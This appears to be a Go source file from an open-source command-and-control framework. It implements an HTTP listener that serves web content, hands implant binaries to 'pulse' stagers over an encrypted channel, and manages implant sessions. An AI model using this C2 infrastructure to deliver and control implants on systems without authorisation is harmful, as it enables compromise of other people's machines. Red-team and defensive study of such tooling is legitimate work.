package listener

import (
	"context"
	"errors"
	"fmt"
	"github.com/chainreactors/malice-network/server/internal/configs"
	"github.com/chainreactors/malice-network/server/internal/parser"
	cryptostream "github.com/chainreactors/malice-network/server/internal/stream"
	"io"
	"net/http"
	"path"
	"strings"

	"github.com/chainreactors/logs"
	"github.com/chainreactors/malice-network/helper/consts"
	"github.com/chainreactors/malice-network/helper/encoders"
	"github.com/chainreactors/malice-network/helper/encoders/hash"
	"github.com/chainreactors/malice-network/helper/proto/client/clientpb"
	"github.com/chainreactors/malice-network/helper/proto/implant/implantpb"
	"github.com/chainreactors/malice-network/helper/proto/services/listenerrpc"
	"github.com/chainreactors/malice-network/helper/types"
	"github.com/chainreactors/malice-network/helper/utils/peek"
	"github.com/chainreactors/malice-network/server/internal/certutils"
	"github.com/chainreactors/malice-network/server/internal/core"
)

type Website struct {
	port     int
	server   *http.Server
	rpc      listenerrpc.ListenerRPCClient
	rootPath string
	Name     string
	Enable   bool
	*core.PipelineConfig
	Content map[string]*clientpb.WebContent
}

func StartWebsite(rpc listenerrpc.ListenerRPCClient, pipeline *clientpb.Pipeline, content map[string]*clientpb.WebContent) (*Website, error) {
	websitePp := pipeline.GetWeb()
	web := &Website{
		port:           int(websitePp.Port),
		rootPath:       websitePp.Root,
		rpc:            rpc,
		PipelineConfig: core.FromProtobuf(pipeline),
		Content:        content,
	}
	err := web.Start()
	if err != nil {
		return nil, err
	}
	return web, nil
}

func (w *Website) ID() string {
	return w.Name
}

func (w *Website) Start() error {
	mux := http.NewServeMux()
	mux.HandleFunc(path.Join(w.rootPath, "/"), w.websiteContentHandler)
	var err error
	tlsConfig, err := certutils.WrapToTlsConfig(w.Tls)
	if err != nil {
		return err
	}
	w.server = &http.Server{Addr: fmt.Sprintf("0.0.0.0:%d", w.port),
		TLSConfig: tlsConfig,
		Handler:   mux,
	}
	go func() {
		logs.Log.Importantf("HTTP Server is running on port %d", w.port)
		if err = w.server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			logs.Log.Errorf("HTTP Server failed to start: %v", err)
		}
	}()
	return nil
}

func (w *Website) Close() error {
	if w.server != nil {
		logs.Log.Importantf("Stopping server")
		err := w.server.Shutdown(nil)
		if err != nil {
			return err
		}
		w.server = nil
		return nil
	} else {
		return errors.New("server is not running")
	}
}

func (w *Website) ToProtobuf() *clientpb.Pipeline {
	p := &clientpb.Pipeline{
		Name:       w.Name,
		Enable:     w.Enable,
		ListenerId: w.ListenerID,
		Body: &clientpb.Pipeline_Web{
			Web: &clientpb.Website{
				Port: uint32(w.port),
				Root: w.rootPath,
			},
		},
		Tls: w.Tls.ToProtobuf(),
	}
	return p
}

func (w *Website) websiteContentHandler(resp http.ResponseWriter, req *http.Request) {
	contentPath := strings.TrimRight(req.URL.Path, "/")
	content, ok := w.Content[contentPath]
	if !ok {
		logs.Log.Debugf("%s Failed to get content ", req.URL)
		return
	}

	// 根据content type处理不同的协议
	switch content.Type {
	case consts.ImplantPulse:
		w.handlePulse(resp, req, content)
	//case consts.ImplantMalefic:
	//	w.handleMalefic(resp, req, content)
	default:
		// 默认处理方式，直接返回内容
		resp.Header().Add("Content-Type", content.ContentType)
		resp.Header().Add("Cache-Control", "no-store, no-cache, must-revalidate")
		resp.Write(content.Content)
	}
}

func (w *Website) handlePulse(resp http.ResponseWriter, req *http.Request, content *clientpb.WebContent) {
	resp.Header().Add("Content-Type", "application/octet-stream")
	resp.Header().Add("Cache-Control", "no-store, no-cache, must-revalidate")

	par, err := parser.NewParser(consts.ImplantPulse)
	if err != nil {
		logs.Log.Errorf("Failed to create parser: %v", err)
		return
	}

	cry, err := configs.NewCrypto(content.Encryption)
	if err != nil {
		logs.Log.Errorf(err.Error())
		return
	}
	rwc := cryptostream.NewCryptoRWC(peek.WrapReadWriteCloser(req.Body, resp, req.Body.Close), cry)
	conn := peek.WrapPeekConn(rwc)
	magic, artifactId, err := par.ReadHeader(conn)
	if err != nil {
		logs.Log.Errorf(err.Error())
		return
	}

	builder, err := w.rpc.GetArtifact(context.Background(), &clientpb.Artifact{
		Id: uint32(artifactId),
	})
	if err != nil {
		logs.Log.Errorf("not found artifact %d ,%s ", artifactId, err.Error())
		return
	}
	logs.Log.Infof("send artifact %d %s", builder.Id, builder.Name)

	err = par.WritePacket(conn, types.BuildOneSpites(&implantpb.Spite{
		Name: consts.ModuleInit,
		Body: &implantpb.Spite_Init{
			Init: &implantpb.Init{Data: builder.Bin},
		},
	}), magic)
	if err != nil {
		logs.Log.Errorf(err.Error())
		return
	}
}

func (w *Website) handleMalefic(resp http.ResponseWriter, req *http.Request, content *clientpb.WebContent) {
	resp.Header().Add("Content-Type", "application/octet-stream")
	resp.Header().Add("Cache-Control", "no-store, no-cache, must-revalidate")

	conn := peek.WrapPeekConn(peek.WrapReadWriteCloser(req.Body, resp, req.Body.Close))

	par, err := parser.NewParser(consts.ImplantMalefic)
	if err != nil {
		logs.Log.Errorf("Failed to create parser: %v", err)
		return
	}

	sid, _, err := par.PeekHeader(conn)
	if err != nil {
		logs.Log.Errorf(err.Error())
		return
	}

	var connect *core.Connection
	if newC := core.Connections.Get(hash.Md5Hash(encoders.Uint32ToBytes(sid))); newC != nil {
		connect = newC
	} else {
		connect = core.NewConnection(par, sid, w.ID())
		core.Connections.Add(connect)
	}

	// 处理请求
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	err = connect.Handler(ctx, conn)
	if err != nil && !errors.Is(err, io.EOF) {
		logs.Log.Debugf("handler error: %s", err.Error())
		return
	}
}

func (w *Website) AddContent(content *clientpb.WebContent) {
	w.Content[content.Path] = content
}
